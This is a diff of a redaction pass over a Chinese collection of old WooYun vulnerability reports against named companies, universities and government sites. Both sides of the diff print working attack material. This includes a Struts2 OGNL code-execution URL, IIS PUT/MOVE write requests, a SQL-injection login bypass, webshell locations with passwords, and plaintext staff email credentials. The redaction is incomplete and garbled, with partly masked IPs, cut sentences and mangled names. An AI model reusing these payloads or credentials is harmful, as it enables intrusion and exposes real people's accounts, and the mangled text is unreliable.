 **元思考**: 触发信号: 功能测试
 
@@ -6234,7 +6234,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://hd.tj.ct10000.com/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment%3Atype%3DDeploymentScanner%2Cflavor%3DURL
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6244,8 +6244,8 @@
 ---
 
 ---
-### [wooyun-2014-068357] 腾讯某服务器mongodb可直接访问
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-068357] 某互联网公司某服务器mongodb可直接访问
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -6258,7 +6258,7 @@
 
 **详情**: mongodb很久之前的漏洞了。
 
-**POC**: 地址：182.254.131.42用软件连接上27017端口 用户名密码不用填上几张低清无码图
+**POC**: 地址：[IP已脱敏]用软件连接上27017端口 用户名密码不用填上几张低清无码图
 
 **绕过**: 直接利用
 
@@ -6278,9 +6278,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 域名：http://app.info.hc360.com/存在IIS 写权限漏洞。可以直接写入可执行文件，从而导致任意代码执行。PUT /test.txt HTTP/1.1host: app.info.hc360.comContent-Length: 4testMOVE /test.txt HTTP/1.1host: app.info.hc360.comDestinaction:http://app.info.hc360.com/iistest.asp
+**详情**: 域名：https://example.com/[已脱敏] 写权限漏洞。可以直接写入可执行文件，从而导致任意代码执行。PUT /test.txt HTTP/1.1host: app.info.hc360.comContent-Length: 4testMOVE /test.txt HTTP/1.1host: app.info.hc360.comDestinaction:https://example.com/[已脱敏]
 
-**POC**: http://app.info.hc360.com/iistest.aspHTTP/1.1 200 OKDate: Wed, 25 Dec 2013 16:35:56 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETContent-Length: 0Accept-Ranges: bytesDASL: <DAV:sql>DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
+**POC**: https://example.com/[已脱敏] 200 OKDate: Wed, 25 Dec 2013 16:35:56 GMTServer: Microsoft-IIS/6.0X-Powered-By: ASP.NETContent-Length: 0Accept-Ranges: bytesDASL: <DAV:sql>DAV: 1, 2Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
 
 **绕过**: 直接利用
 
@@ -6300,9 +6300,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.whschgm.com被渗透后发现马儿可以历遍该服务器目录还有个搜狗输入法，借助WooYun: 搜狗输入法设计缺陷助我成功提权可以提权（但是有360套装）看下图貌似还有LED平台亮化平台
+**详情**: https://example.com/[已脱敏] 搜狗输入法设计缺陷助我成功提权可以提权（但是有360套装）看下图貌似还有LED平台亮化平台
 
-**POC**: 可下载附：马儿地址：http://www.whschgm.com/143.asp    admin
+**POC**: 可下载附：马儿地址：https://example.com/[已脱敏]    admin
 
 **绕过**: 直接利用
 
@@ -6344,7 +6344,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录接口:http://api.passport.pptv.com/dologin.do虽然有验证码，但是只要抓包之后把cookies去掉即可。之后就再也没有验证码提示。于是，拿出我珍藏多年的裤子对其撞库。
+**详情**: 登录接口:https://example.com/[已脱敏]
 
 **POC**: 只要返回数值在1W一下的，就是撞库成功的
 
@@ -6366,7 +6366,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 菊花:http://www.gsjtzb.com/gsjtzb.rar
+**详情**: 菊花:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6388,7 +6388,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 美菜CRM系统http://crm.yunshanmeicai.com/打包口令36	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	31842	jinhuainan@yunshanmeicai.com	meicai123	302	false	false	32546	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	31867	yaodanxu@yunshanmeicai.com	meicai123	302	false	false	318100	liuqiwen@yunshanmeicai.com	meicai123	302	false	false	326157	zhaominglei@yunshanmeicai.com	meicai123	302	false	fal
+**详情**: 美菜CRM系统https://example.com/[已脱敏]	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	31842	jinhuainan@yunshanmeicai.com	meicai123	302	false	false	32546	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	31867	yaodanxu@yunshanmeicai.com	meicai123	302	false	false	318100	liuqiwen@yunshanmeicai.com	meicai123	302	false	false	326157	zhaominglei@yunshanmeicai.com	meicai123	302	false	fal
 
 **POC**: ··
 
@@ -6476,7 +6476,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://59.61.88.198:8000/由下图及夹逼定理可以肯定该IP是联想的
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -6498,9 +6498,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://dds.dji.comhttp://api.dji.com一张图就能懂系列~
+**详情**: URL：https://example.com/[已脱敏]
 
-**POC**: 另外还有两处SVN未修复，不知道之前两位前辈有没有提过，提过请无视~http://we.dji.com:80/assets/.svn/entrieshttp://corp.dji.com:80/assets/.svn/entries
+**POC**: 另外还有两处SVN未修复，不知道之前两位前辈有没有提过，提过请无视~https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6520,7 +6520,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个注入点是我用谷歌语法inurl:php?+You have an error in your SQL syntax 得来的。打开这个网站，随意一个带参数的加个'都报错，http://bjmh.mau.edu.cn/news.php?cid=1用pangolin跑了下，发现是root权限，但是读取不了文件，网站路径我也不懂得爆。用御剑跑一下目录，发现了/install/index.php马上打开看了一下，这可玩大发了数据库用户和管理员都是可以重置的。这可吓尿我了，我一动都不敢动，等下把整个网站搞瘫了就糟糕了。灵机一动，就跑到乌云来提交了 。不为别的，就想在提交漏洞的同时获取一枚邀请码，与大牛们为伍学习。跪求邀请码。
+**详情**: 这个注入点是我用谷歌语法inurl:php?+You have an error in your SQL syntax 得来的。打开这个网站，随意一个带参数的加个'都报错，https://example.com/[已脱敏] 。不为别的，就想在提交漏洞的同时获取一枚邀请码，与大牛们为伍学习。跪求邀请码。
 
 **POC**: 满站尽带注入点root注入点系统重装漏洞
 
@@ -6530,8 +6530,8 @@
 ---
 
 ---
-### [wooyun-2011-02149] 腾讯智慧后台路径泄漏
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-02149] 某互联网公司智慧后台路径泄漏
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -6544,7 +6544,7 @@
 
 **详情**: 访问网站中有一些敏感文件和敏感目录配置不当,因此泄露后台路径等信息,如果泄露信息被入侵者利用可能导致网站被入侵.
 
-**POC**: 在站点跟目录提交electronbookhttp://www.tencentmind.com/electronbook<br /><b>Warning</b>:  opendir(/home/admin/zb_html/content/content/trunk/s/electronbook/electronbook) [<a href='function.opendir'>function.opendir</a>]: failed to open dir: No such file or directory in <b>/home/admin/zb_html/content/content/
+**POC**: 在站点跟目录提交electronbookhttps://example.com/[已脱敏] /><b>Warning</b>:  opendir(/home/admin/zb_html/content/content/trunk/s/electronbook/electronbook) [<a href='function.opendir'>function.opendir</a>]: failed to open dir: No such file or directory in <b>/home/admin/zb_html/content/content/
 
 **绕过**: 直接利用
 
@@ -6564,7 +6564,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先，管理http://mail.lookango.com/的人估计应该是处女座的，不然咋设置的邮箱密码咋那么有规律？比如，员工zhangsan@lookango.com，那他的密码就是zhang-san，lisi@lookango.com的密码就是li-si可测试账号：wenweixin@lookango.comcaiyuhang@lookango.comzengcan@lookango.comyangcong@lookango.comqiushulong@lookango.com然后随便登录了几个，如下图
+**详情**: 首先，管理https://example.com/[已脱敏]
 
 **POC**: 同上
 
@@ -6608,9 +6608,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://180.153.191.147:8088/clusterhttp://180.153.191.147:50090/status.jsphttp://180.153.191.147:50090/logs/http://180.153.191.147:50070/dfshealth.html#tab-overview
+**详情**: http://[IP已脱敏]
 
-**POC**: http://180.153.191.147:50070/jmx{"beans" : [ {"name" : "java.lang:type=Memory","modelerType" : "sun.management.MemoryImpl","Verbose" : false,"HeapMemoryUsage" : {"committed" : 109051904,"init" : 260302592,"max" : 932184064,"used" : 72540568},"NonHeapMemoryUsage" : {"committed" : 60162048,"init" : 24
+**POC**: http://[IP已脱敏] : [ {"name" : "java.lang:type=Memory","modelerType" : "sun.management.MemoryImpl","Verbose" : false,"HeapMemoryUsage" : {"committed" : 109051904,"init" : 260302592,"max" : 932184064,"used" : 72540568},"NonHeapMemoryUsage" : {"committed" : 60162048,"init" : 24
 
 **绕过**: 直接利用
 
@@ -6630,9 +6630,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 靖江市图书馆http://58.222.235.93:80/
+**详情**: 靖江市图书馆http://[IP已脱敏]
 
-**POC**: http://58.222.235.93/20141706071712.asp;.txt密码z
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -6640,8 +6640,8 @@
 ---
 
 ---
-### [wooyun-2013-023986] 手机腾讯网某分站代码执行
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-023986] 手机某互联网公司网某分站代码执行
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -6654,7 +6654,7 @@
 
 **详情**: ..如上
 
-**POC**: http://500wan.3g.qq.com/3g/buy/dlc/dlckp_index.action?debug=command&expression=%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPa
+**POC**: https://example.com/[已脱敏]]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23xman=@org.apache.struts2.ServletActionContext@getResponse(),%23xman.getWriter().println(%23req.getRealPa
 
 **绕过**: 直接利用
 
@@ -6674,7 +6674,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. http://archives.hainan.gov.cn/1.zip海南省档案局2. http://lib.zjdx.gov.cn/1.rar浙江省委党校3. http://www.tcom.gov.cn/web.rarhttp://www.tcom.gov.cn/web.zip台州商务局4. http://www.zzkjw.gov.cn/zzkjw.gov.cn.rar枣庄会计网
+**详情**: 1. https://example.com/[已脱敏] https://example.com/[已脱敏] https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6706,7 +6706,7 @@
 ---
 
 ---
-### [wooyun-2016-0193408] 国联证券某站点存在文件遍历漏洞导致微信公众号可控
+### [wooyun-2016-0193408] 国联证券某站点存在文件遍历漏洞导致某互联网公司公众号可控
 **厂商**: 国联证券 | **年份**: 2016 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
@@ -6718,9 +6718,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://58.215.43.162/osoa/views/index.html?r=0.9203477809205651存在resin文件遍历漏洞http://58.215.43.162//%20../web-inf/
+**详情**: http://[IP已脱敏]
 
-**POC**: 配置文件泄露可控制微信公众号
+**POC**: 配置文件泄露可控制某互联网公司公众号
 
 **绕过**: 直接利用
 
@@ -6728,8 +6728,8 @@
 ---
 
 ---
-### [wooyun-2012-05677] 淘宝某分站存在nginx解析漏洞
-**厂商**: 淘宝网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-05677] 某电商平台某分站存在nginx解析漏洞
+**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -6740,9 +6740,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝某分站存在nginx解析漏洞,而且使用了开源的调查问卷系统。
+**详情**: 某电商平台某分站存在nginx解析漏洞,而且使用了开源的调查问卷系统。
 
-**POC**: 淘宝某分站存在nginx解析漏洞,而且使用了开源的调查问卷系统。
+**POC**: 某电商平台某分站存在nginx解析漏洞,而且使用了开源的调查问卷系统。
 
 **绕过**: 直接利用
 
@@ -6762,7 +6762,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点融网随便看下：https://github.com/chengtalent/SpringDemo/blob/1fae7c734120357d7e0b8ee2d0b3b28275145206/build.gradlemaven {url 'http://archiva.dianrong.com/repository/mirror'credentials {username = 'developer'password = 'welcome123'}}maven {url 'http://archiva.dianrong.com/repository/internal'credentials {username = 'developer'password = 'welcome123'}}maven {url 'http://archiva.dianrong.com/repository/sna
+**详情**: 点融网随便看下：https://example.com/[已脱敏] {url 'https://example.com/[已脱敏]'credentials {username = 'developer'password = 'welcome123'}}maven {url 'https://example.com/[已脱敏]'credentials {username = 'developer'password = 'welcome123'}}maven {url 'https://example.com/[已脱敏]
 
 **POC**: ···
 
@@ -6784,7 +6784,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 真人真事，一大爷骑自行车给一宝马刮了，大爷车损失也不小，宝马男下车看看大爷，刚想开骂，大爷一句话宝马男就熄火了。大爷讲得那句话是，小子，别逼我躺下！101.251.197.245
+**详情**: 真人真事，一大爷骑自行车给一宝马刮了，大爷车损失也不小，宝马男下车看看大爷，刚想开骂，大爷一句话宝马男就熄火了。大爷讲得那句话是，小子，别逼我躺下！[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -6806,7 +6806,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 冰点智能DNS管理系统http://121.207.254.4/myadmin/index.php?lang=en-iso-8859-1&server=1用户：root密码：空
+**详情**: # 冰点智能DNS管理系统http://[IP已脱敏]
 
 **POC**: # 漏洞证明
 
@@ -6828,7 +6828,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://sns.amap.comip地址106.3.34.61-65全部存在心脏滴血python OpenSSL.pyinput IP:sns.amap.comWARNING: server returned more data than it should - server is vulnerable!@SC[r+H9w3f"!98532ED/AI42#|5 2xw.5mR|CE4@$ua~|gOjX^WM9Y~"InrdxqRzzX4j88s9X5Rkm5NaNE%2BI2l1ehizO%2Fecgd79TMTHLpDZoOwy5qlw1uB8veWWAjeMkYoz26LqJ9RWlx1dsFF8f0FoIkxH%2BwPmgkCDwq4uAHPI8v1W9tsWYR6p8VAMhtGoIuyIQknGlD4pPIjZX7D41P7VNqOisCvP8JwhH0kB7i5wf
+**详情**: https://example.com/[已脱敏] OpenSSL.pyinput IP:sns.amap.comWARNING: server returned more data than it should - server is vulnerable!@SC[r+H9w3f"!98532ED/AI42#|5 2xw.5mR|CE4@$ua~|gOjX^WM9Y~"InrdxqRzzX4j88s9X5Rkm5NaNE%2BI2l1ehizO%2Fecgd79TMTHLpDZoOwy5qlw1uB8veWWAjeMkYoz26LqJ9RWlx1dsFF8f0FoIkxH%2BwPmgkCDwq4uAHPI8v1W9tsWYR6p8VAMhtGoIuyIQknGlD4pPIjZX7D41P7VNqOisCvP8JwhH0kB7i5wf
 
 **POC**: Host: sns.amap.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 90--3i2ndDfv2rTHiSisAbouNdArYfORhtTPEefj3q2f--3i2ndDfv2rTHiSisAbouNdArYfORhtTPEefj3q2fJV{iNdArYfORhtTPEefj3q2f?v9ChTV^pV=AB0D202CD88A19BFF02966AD2AA8625FDFBAD3FF62D934C88430B3101DD0E8DA00DB471FE797F839041770C46E6D0CF4;BIGip
 
@@ -6874,7 +6874,7 @@
 
 **详情**: 受影响的版本为：Microsoft .NET Framework 2.0Microsoft .NET Framework 3.5Microsoft .NET Framework 3.5.1Microsoft .NET Framework 4Microsoft .NET Framework 4.5Microsoft .NET Framework 4.5.1利用条件：1.需要支持aspx并且高于Microsoft .NET Framework 1.14版本2.安全模式除外（现在还没有能突破.net安全模式的方法）漏洞说明：该漏洞可直接赋予文件权限（让没权限的文件执行）
 
-**POC**: 不太会表达  直接演示吧我们现在拿星外虚拟主机的环境来测试漏洞，星外主机权限是出了名的小 我们都知道的 没有可写目录是不可能执行命令并提权的至于在根目录下执行cmd是根本不可能的事，下面我将利用此漏洞来见证这奇妙的一瞬间http://www.blpty.com/js/style/cun.aspx  密码c   (星外主机环境shell  用于演示漏洞)现在根目录下执行set命令显示拒绝访问 （没权限）接下来上传我们的cmd文件 (建议上传windows xp  cmd.exe)并设置为终端 setp E:\fxhost\blptycom\web\cmd.exe图中的cmd是没权限的，下面开始使
+**POC**: 不太会表达  直接演示吧我们现在拿星外虚拟主机的环境来测试漏洞，星外主机权限是出了名的小 我们都知道的 没有可写目录是不可能执行命令并提权的至于在根目录下执行cmd是根本不可能的事，下面我将利用此漏洞来见证这奇妙的一瞬间https://example.com/[已脱敏]  密码c   (星外主机环境shell  用于演示漏洞)现在根目录下执行set命令显示拒绝访问 （没权限）接下来上传我们的cmd文件 (建议上传windows xp  cmd.exe)并设置为终端 setp E:\fxhost\blptycom\web\cmd.exe图中的cmd是没权限的，下面开始使
 
 **绕过**: 直接利用
 
@@ -6894,9 +6894,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://open.elong.comhttp://open.elong.com/QA/uploads/mssql2009.php
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://open.elong.comhttp://open.elong.com/QA/uploads/mssql2009.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6918,7 +6918,7 @@
 
 **详情**: 域名并不是很多，但是域传送还是有其他风险的吧
 
-**POC**: > set type=ns> sec580.com服务器:  68.128.128.61.cq.cq.cta.net.cnAddress:  61.128.128.68非权威应答:sec580.com      nameserver = ns2.anquanbao.comsec580.com      nameserver = ns1.anquanbao.com> server ns1.anquanbao.com默认服务器:  ns1.anquanbao.comAddress:  116.213.78.205> ls -d sec580.com[ns1.anquanbao.com]sec580
+**POC**: > set type=ns> sec580.com服务器:  [IP已脱敏].cq.cq.cta.net.cnAddress:  [IP已脱敏]非权威应答:sec580.com      nameserver = ns2.anquanbao.comsec580.com      nameserver = ns1.anquanbao.com> server ns1.anquanbao.com默认服务器:  ns1.anquanbao.comAddress:  [IP已脱敏]> ls -d sec580.com[ns1.anquanbao.com]sec580
 
 **绕过**: 直接利用
 
@@ -6938,7 +6938,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 金万邦科技 DNS域传送漏洞C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> gzidc.comServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:Name:    gzidc.comAddress:  211.147.245.88> set type=ns> gzidc.comServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:gzidc.com       nameserver = ns.gzi
+**详情**: 金万邦科技 DNS域传送漏洞C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> gzidc.comServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:Name:    gzidc.comAddress:  [IP已脱敏]> set type=ns> gzidc.comServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:gzidc.com       nameserver = ns.gzi
 
 **POC**: (见原文)
 
@@ -6960,7 +6960,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.几乎所有带参数的动态页面都存在注射......列举两个：http://www.hongkongbmw.com/hotel/?id=261http://www.hongkongbmw.com/hotel/hongkonghotels.asp?area=232.手工和工具都可以：md5解出来是个很读起来很欢愉的密码。。。3.后台扫描不到，但是最后通过各种猥琐的搜索引擎找到了：4.虽然自己把程序改的面目全非，但是漏掉了一个上传点的asa和cer过滤：5.上传一句话，菜刀顺利连接：6.可笑的事情出现了，权限大到可以访问任何目录，所有盘符全部溢出。后来发现一句话的权限和大马一样，绝对的服务器配置不当。脱了两个裤子，但是没啥用……其他站的都没动，实在太多。
+**详情**: 1.几乎所有带参数的动态页面都存在注射......列举两个：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6982,7 +6982,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01:Mysql口令被破解IP：121.41.108.27经过测试此服务器是你们的一个数据库服务，只开放了3306121.41.108.27:3306账号密码你们的URL foxhis/foxhis连接如图：
+**详情**: 0x01:Mysql口令被破解IP：[IP已脱敏]经过测试此服务器是你们的一个数据库服务，只开放了3306121.41.108.27:3306账号密码你们的URL foxhis/foxhis连接如图：
 
 **POC**: 涉及库与表过多，以下只截图展示下影响的敏感信息，点到为止：
 
@@ -7006,7 +7006,7 @@
 
 **详情**: 外网可以访问memcached！
 
-**POC**: nc 180.186.32.205 11211nc 180.186.32.205 11212（刚好象还看到了与renren的一些用户登录的交互数据！）（看到了，人家大量使用memcached存储复杂对象了，不只是String）
+**POC**: nc [IP已脱敏] 11211nc [IP已脱敏] 11212（刚好象还看到了与renren的一些用户登录的交互数据！）（看到了，人家大量使用memcached存储复杂对象了，不只是String）
 
 **绕过**: 直接利用
 
@@ -7026,7 +7026,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.qphhyx.com:8009/常用用户名和123456成功爆破多名用户
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 先贴这么几图证明一下成功登录...还有多少用户就不贴了可修改的
 
@@ -7070,7 +7070,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 原链接：http://mail.qiyi.com/iwc_static/layout/login.html绕过链接：http://mail.qiyi.com/iwc_static/layout#login.html邮件服务器根目录：可以看到登录界面但是需密码 想了半天搁浅了根目录：
+**详情**: 原链接：https://example.com/[已脱敏] 想了半天搁浅了根目录：
 
 **POC**: 问题算不大，但毕竟有风险。
 
@@ -7092,7 +7092,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 112.90.57.34113.105.245.101113.105.245.110120.31.135.196120.31.135.20961.142.208.135memcached默认端口可以远程使用
+**详情**: [IP已脱敏]13.105.245.101113.105.245.110120.31.135.196120.31.135.20961.142.208.135memcached默认端口可以远程使用
 
 **POC**: (见原文)
 
@@ -7116,7 +7116,7 @@
 
 **详情**: 一个点引发的一个物理路径
 
-**POC**: 模块 IIS Web Core通知 MapRequestHandler处理程序 StaticFile错误代码 0x80070002请求的 URL http://www.veryeast.cn:80/inc/config.asp'物理路径 D:\webRoot\inc\config.asp'登录方法 匿名登录用户 匿名
+**POC**: 模块 IIS Web Core通知 MapRequestHandler处理程序 StaticFile错误代码 0x80070002请求的 URL https://example.com/[已脱敏]'物理路径 D:\webRoot\inc\config.asp'登录方法 匿名登录用户 匿名
 
 **绕过**: 直接利用
 
@@ -7136,7 +7136,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天偶然看到，后台并且还有其他人部署的war包啊。。http://vi.iflytek.com/web-console/http://vi.iflytek.com/jmx-console/通过webconsole还能看到好多应用的状态等信息。。。
+**详情**: 今天偶然看到，后台并且还有其他人部署的war包啊。。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7146,8 +7146,8 @@
 ---
 
 ---
-### [wooyun-2012-09140] 百度站长论坛后台泄漏
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-09140] 某搜索引擎站长论坛后台泄漏
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 后台管理
 
@@ -7158,9 +7158,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度站长论坛的后台地址泄漏
+**详情**: 某搜索引擎站长论坛的后台地址泄漏
 
-**POC**: http://bbs.zhanzhang.baidu.com/uc_server/admin.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7180,9 +7180,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中粮某在线购物平台导致会员信息泄漏http://vip.cofco.com:8081/http://vip.cofco.com:8081/12.zip
+**详情**: 中粮某在线购物平台导致会员信息泄漏https://example.com/[已脱敏]
 
-**POC**: 中粮某在线购物平台导致会员信息泄漏http://vip.cofco.com:8081/http://vip.cofco.com:8081/12.zip
+**POC**: 中粮某在线购物平台导致会员信息泄漏https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7190,8 +7190,8 @@
 ---
 
 ---
-### [wooyun-2014-053830] 中国电信某系统数据库下载及服务器信息泄漏
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-053830] 某运营商某系统数据库下载及服务器信息泄漏
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -7202,9 +7202,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信168315与118958企业服务中心网站网址：http://www.118958.org/或：http://61.191.25.187/
+**详情**: 某运营商168315与118958企业服务中心网站网址：https://example.com/[已脱敏]
 
-**POC**: 1.目录遍历：看到数据库了。。下来看看人品各种不好啊。。md5无解。。各种社工库，各种拼密码，无果。。。。眼睁睁的看着多好的后台进不去。。http://61.191.25.187/admin/login.asp2.服务器配置信息泄漏后台进不去，，在服务器上翻到个这玩意。。。http://61.191.25.187/tool/aspcheck.asp阿江asp探针。。给出了一些服务器的配置信息，支持组件什么的。。3.然后。。然后就没然后了。。。。
+**POC**: 1.目录遍历：看到数据库了。。下来看看人品各种不好啊。。md5无解。。各种社工库，各种拼密码，无果。。。。眼睁睁的看着多好的后台进不去。。http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -7268,9 +7268,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 公司最近要租用机器，在百度上无目的地搜索着。由于西部数码的广告大的缘故，把我带进来你们网站。导致了本次渗透测试的发生。首先查看了west263.com对应ip地址。https://www.dnspod.cn/tools#/west263.com看到以上信息，我得到的结果是。站点应该使用了负载均衡架构模式。经过对ip地址的判断，我以61.139.126.59为站点的源ip来展开了这一系列的C段渗透。渗透测试的步骤：获取C段所有域名-->CMS识别-->oday狠狠的打。（ps：我是懒人，喜欢自动化）本次安全问题出在运维人员对文件权限的控制认知不透彻造成的。
+**详情**: 公司最近要租用机器，在某搜索引擎上无目的地搜索着。由于西部数码的广告大的缘故，把我带进来你们网站。导致了本次渗透测试的发生。首先查看了west263.com对应ip地址。https://example.com/[已脱敏]
 
-**POC**: Ip：61.139.126.251shell：http://gyzy120.com/plus/help.php   （Passwd:silic）备份的主机配置文件：/bkup/baiunewvhost.conf备份数据库：/bkup/innodbmysql根据备份出来的数据库名字-->在备份的主机配置文件中搜索-->就能找到相关域名=秒杀所有站点。下面的主机虽然/bkup目录了751权限，但是经过我的举一反三后，稍稍改变下url同样能访问到文件内容的哦。Ip：61.139.126.244http://tsboai.com/plus/help.php?s=p&fp=%2Fbkup&fn=baiu
+**POC**: Ip：[IP已脱敏]shell：https://example.com/[已脱敏]   （Passwd:silic）备份的主机配置文件：/bkup/baiunewvhost.conf备份数据库：/bkup/innodbmysql根据备份出来的数据库名字-->在备份的主机配置文件中搜索-->就能找到相关域名=秒杀所有站点。下面的主机虽然/bkup目录了751权限，但是经过我的举一反三后，稍稍改变下url同样能访问到文件内容的哦。Ip：[IP已脱敏]https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7278,8 +7278,8 @@
 ---
 
 ---
-### [wooyun-2012-05633] 新浪多个后台泄漏
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-05633] 某社交平台多个后台泄漏
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -7290,9 +7290,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cinema.ent.sina.com.cn/manage/login.phphttp://mindcity.sina.com.tw/admin/index.phphttp://bug.show.sina.com.cn/admin/http://129.pub.sina.com.cn:8080/cgi-bin/gsps/v5/index.cgi
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://cinema.ent.sina.com.cn/manage/login.phphttp://mindcity.sina.com.tw/admin/index.phphttp://bug.show.sina.com.cn/admin/http://129.pub.sina.com.cn:8080/cgi-bin/gsps/v5/index.cgi
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7334,7 +7334,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用谷歌搜索到东南大学软件学院的后台，无意就进入了上次没给过 呜呜～首先网址是http://cose-sz.seu.edu.cn/它的后台网址是http://cose-sz.seu.edu.cn/admin/manager/Com_index.action用户名：admin密码是：admin' or 'a'='a就可以干你想干的事了如不过好像它已经被别人给url跳转到另一个网站了，应该是有人也知道了
+**详情**: 用谷歌搜索到东南大学软件学院的后台，无意就进入了上次没给过 呜呜～首先网址是https://example.com/[已脱敏]' or 'a'='a就可以干你想干的事了如不过好像它已经被别人给url跳转到另一个网站了，应该是有人也知道了
 
